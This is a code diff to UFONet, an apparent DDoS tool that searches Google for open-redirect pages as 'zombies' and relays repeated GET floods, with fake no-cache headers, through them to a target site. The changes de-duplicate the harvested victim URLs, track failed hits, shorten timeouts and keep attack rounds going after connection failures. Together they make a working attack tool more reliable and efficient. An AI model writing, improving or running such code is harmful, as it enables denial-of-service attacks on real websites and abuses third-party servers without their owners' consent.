@@ -67,6 +67,7 @@ class UFONet(object):
         self.attack_mode = False
         self.retries = ''
         self.delay = ''
+        self.connection_failed = False
 
     def set_options(self, options):
         self.options = options
@@ -143,6 +144,7 @@ class UFONet(object):
             try:
                 self.banner()
                 print("\nSearching for 'zombies' on google results. Good Luck ;-)\n")
+                print '='*22 + '\n'
                 zombies = self.search_zombies()
                 check_url_link_reply = raw_input("Wanna check if they are valid zombies? (Y/n)\n")
                 print '-'*25
@@ -218,8 +220,18 @@ class UFONet(object):
             url_link = urllib.unquote(url_link).decode('utf8') # unquote encoding
             sep = str(options.search)
             url_link = url_link.rsplit(sep, 1)[0] + sep
-            print('+Found possible victim: ' + url_link + '\n')
-            zombies.append(url_link)
+            if url_link not in zombies: # parse possible repetitions
+                print('+Victim found: ' + url_link)
+                print '-'*12
+                zombies.append(url_link)
+            else:
+                pass
+        if len(zombies) == 0:
+            print "[INFO] - Not any possible victim found!. Try another search (ex: 'proxy.php?url=').\n"
+            sys.exit(2)
+        print '\n' + '='*22
+        print('+Possible Zombies: ' + str(len(zombies)))
+        print '='*22 + '\n'
         return zombies
 
     def extract_zombies(self):
@@ -302,7 +314,6 @@ class UFONet(object):
                 print url_attack
             c.setopt(pycurl.URL, url_attack) # GET connection on target site
             c.setopt(pycurl.NOBODY, 0)  # use GET
-
         fakeheaders = ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8', 'Cache-control: no-cache', 'Pragma: no-cache', 'Pragma-directive: no-cache', 'Cache-directive: no-cache', 'Expires: 0'] # set fake headers (important: no-cache)
         c.setopt(pycurl.FOLLOWLOCATION, 1) # set follow redirects
         c.setopt(pycurl.MAXREDIRS, 10) # set max redirects
@@ -346,8 +357,8 @@ class UFONet(object):
             c.setopt(pycurl.TIMEOUT, options.timeout)
             c.setopt(pycurl.CONNECTTIMEOUT, options.timeout)
         else:
-            c.setopt(pycurl.TIMEOUT, 30)
-            c.setopt(pycurl.CONNECTTIMEOUT, 30)
+            c.setopt(pycurl.TIMEOUT, 10)
+            c.setopt(pycurl.CONNECTTIMEOUT, 10)
         if options.delay: # set delay
             self.delay = options.delay
         else:
@@ -359,13 +370,15 @@ class UFONet(object):
         try: # try to connect
             c.perform()
             time.sleep(self.delay)
+            self.connection_failed = False
         except: # try retries
             for count in range(0, self.retries):
                 time.sleep(self.delay)
-                c.perform()
-                if count == self.retries:
-                    print "\n[Error] - Imposible to connect. Aborting...\n"
-                    sys.exit(2)
+                try:
+                    c.perform()
+                    self.connection_failed = False
+                except:
+                    self.connection_failed = True
         if self.head == True: # HEAD reply
             code_reply = c.getinfo(pycurl.HTTP_CODE)
             reply = b.getvalue()
@@ -564,15 +577,18 @@ class UFONet(object):
                 for i in range(0, int(total_rounds)):
                     for zombie in zombies:
                         print '='*45
-                        print "Zombie:", num_zombie, "| Round:", num_round, "| Total:", total_rounds
+                        print "Zombie:", num_zombie, "| Round:", num_round, "| Total Rounds:", total_rounds
                         print '='*45
                         t = urlparse(zombie)
                         name_zombie = t.netloc
                         self.attack_mode = True
                         print "Name:", name_zombie
                         attack_reply = self.connect_zombies(zombie)
-                        print "Status: Hit!"
-                        num_hits = num_hits + 1
+                        if self.connection_failed == False:
+                            print "Status: Hit!"
+                            num_hits = num_hits + 1
+                        else:
+                            print "Status: Failed :("
                         num_zombie = num_zombie + 1
                         if num_zombie > total_zombie:
                             num_zombie = 1
